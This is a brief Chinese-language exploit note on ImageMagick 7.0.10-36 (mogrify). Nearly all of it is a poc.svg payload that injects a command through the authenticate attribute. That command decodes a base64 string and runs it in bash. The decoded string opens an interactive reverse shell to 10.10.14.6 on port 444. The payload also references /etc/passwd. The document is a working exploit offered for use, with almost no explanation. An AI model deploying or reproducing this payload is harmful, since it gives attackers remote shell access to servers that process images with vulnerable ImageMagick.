# （mogrify）ImageMagick以及一些套件（7.0.10-36）

‍

写一个poc.svg到他处理图片的目录，base64是反弹shell

```bash
<image authenticate='ff" `echo "YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDQgMD4mMSAK" | base64 -d | bash`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="msl:mog-shell.svg" height="100" width="100"/>
  </svg>
</image>
```
